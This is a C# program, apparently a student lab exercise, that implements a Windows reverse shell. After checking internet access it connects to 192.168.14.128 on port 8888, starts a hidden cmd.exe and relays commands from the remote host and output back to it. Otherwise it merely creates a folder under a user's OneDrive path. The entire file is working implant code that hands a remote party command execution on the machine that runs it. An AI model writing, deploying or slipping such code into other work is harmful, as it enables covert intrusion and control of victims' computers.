using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace reverse_shell
{
    class Program
    {
        static StreamWriter str_writer;
        static void Main(string[] args)
        {
            execute();
        }
        static public bool check_internet()
        {
            try
            {
                WebRequest request = HttpWebRequest.Create("https://google.com");
                request.GetResponse();
            }
            catch(WebException ex)
            {
                return false;
            }
            return true;
        }
        static public void execute()
        {
            if(check_internet()==true)
            {
                create_reverse_shell();
            }
            else
            {
                create_folder(@"C:\Users\pexoa\OneDrive - Trường ĐH CNTT - University of Information Technology\Máy tính\Folder_new");
            }
        }
        static public void create_reverse_shell()
        {
            using(TcpClient client= new TcpClient("192.168.14.128",8888))
            {
                using(Stream stream =client.GetStream())
                {
                    using(StreamReader str_reader=new StreamReader(stream))
                    {
                        str_writer = new StreamWriter(stream);
                        StringBuilder str_input = new StringBuilder();
                        Process p = new Process();
                        p.StartInfo.FileName="cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            str_input.Append(str_reader.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(str_input);
                            str_input.Remove(0, str_input.Length);
                        }
                    }    
                }    
            }    
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    str_writer.WriteLine(strOutput);
                    str_writer.Flush();
                }
                catch (Exception err) { }
            }
        }
        static public void create_folder(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                {
                    Directory.CreateDirectory(path);
                }
            }
            catch(Exception ex)
            {
                Console.Write(ex.Message);
            }
        }
    }
}
